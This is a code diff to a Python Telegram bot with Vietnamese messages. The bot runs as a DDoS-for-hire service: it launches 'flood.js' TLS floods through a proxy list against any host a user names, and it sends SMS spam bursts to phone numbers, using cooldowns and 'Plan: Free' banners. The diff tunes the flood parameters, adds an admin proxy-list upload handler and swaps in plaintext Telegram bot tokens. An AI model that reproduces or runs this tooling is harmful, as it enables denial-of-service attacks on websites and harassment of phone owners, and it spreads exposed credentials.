@@ -14,7 +14,7 @@ import io
 import re
 import threading
 
-bot_token = '7576868792:AAGtWpBusJTGwP_6QrbgghHN8mmLhiMdl0Y' 
+bot_token = '7236746522:AAHwzWIRB7V8dRHlG-FWTpPwmr1h968sPYk' 
 bot = telebot.TeleBot(bot_token)
 
 allowed_users = []
@@ -221,18 +221,18 @@ def ddos_command(message):
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
         remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
-        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
+        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack")
         return
     
     host = message.text.split()[1]
-    command = ["node", "flood.js", host, "120", "8", "proxy.txt", "64", "15"]
+    command = ["node", "flood.js", host, "120", "32", "20000", "proxy.txt"]
     duration = 120
 
     cooldown_dict[username] = {'attack': current_time}
 
     attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : quangnqtoolcode\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 90s «\n  ➤ Methods » TLS FREE «\n  ➤ Cooldown » 120s «\n  ➤ Plan » Free «')
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin : quangnqtoolcode\n  ➤ Tấn Công Bởi » {username} «\n  ➤ Host » {host} «\n  ➤ TIME » 120s «\n  ➤ Methods » TLS «\n  ➤ Cooldown » 120s «\n  ➤ Plan » Free «')
 
 
 @bot.message_handler(commands=['proxy'])
@@ -398,7 +398,7 @@ def get_proxy_info(message):
             bot.send_document(message.chat.id, open("proxy.txt", "rb"))
             proxy_update_count += 1
     except FileNotFoundError:
-        bot.reply_to(message, "Không tìm thấy file proxy.txt.")
+        bot.reply_to(message, "Không tìm thấy file proxy.txt")
 
 
 @bot.message_handler(commands=['time'])
@@ -473,7 +473,7 @@ def attack_command(message):
 
     attack_thread = threading.Thread(target=run_sms, args=(command, duration, message))
     attack_thread.start()
-    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {phone_number} \n┣➤ Time: {duration} Giây\n┣➤ Plan: Free \n┣➤ Admin: quangnqtoolcode\n┗━━━━━━━━━━━━━━➤')
+    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ User: @{username} \n┣➤ Phone: {phone_number} \n┣➤ Time: {duration} Giây\n┣➤ Plan: Free \n┣➤ Admin: @quangnqtoolcode\n┗━━━━━━━━━━━━━━➤')
     
 def check_proxy():
     try:
@@ -483,32 +483,31 @@ def check_proxy():
     except FileNotFoundError:
         return 0
 
-# Hàm chạy tệp proxy.py
-def run_proxy_script():
+# Hàm xử lý khi admin gửi tệp
+@bot.message_handler(content_types=['document'])
+def handle_proxy_file(message):
     try:
-        subprocess.run(["python", "proxy.py"], check=True)
-    except Exception as e:
-        print(f"Lỗi khi chạy proxy.py: {e}")
+        if message.from_user.id != ADMIN_ID:
+            bot.reply_to(message, "Bạn không có quyền sử dụng chức năng này")
+            return
 
-# Hàm tự kiểm tra proxy mỗi giờ
-def auto_check_proxy():
-    while True:
-        time.sleep(600)  # Đợi 1 giờ
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        with open("proxy.txt", "wb") as new_file:
+            new_file.write(downloaded_file)
+
+        bot.reply_to(message, "Tệp proxy đã được cập nhật")
+        
+        #run_proxy_script()
+        # Kiểm tra số lượng proxy
         proxy_count = check_proxy()
-        print(f"Số proxy hiện có: {proxy_count}")  # Log cho admin
-
-# Xử lý lệnh /upproxy
-@bot.message_handler(commands=['upproxy'])
-def update_proxy(message):
-    # Chạy proxy.py
-    run_proxy_script()
-
-    # Kiểm tra số lượng proxy
-    proxy_count = check_proxy()
-    bot.reply_to(message, f"Hiện tại có {proxy_count} proxy trong proxy.txt")
+        bot.reply_to(message, f"Hiện tại có {proxy_count} proxy trong proxy.txt.")
+    except Exception as e:
+        bot.reply_to(message, f"Đã xảy ra lỗi: {e}")
     
 @bot.message_handler(func=lambda message: message.text.startswith('/'))
 def invalid_command(message):
-    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
+    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh')
 
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
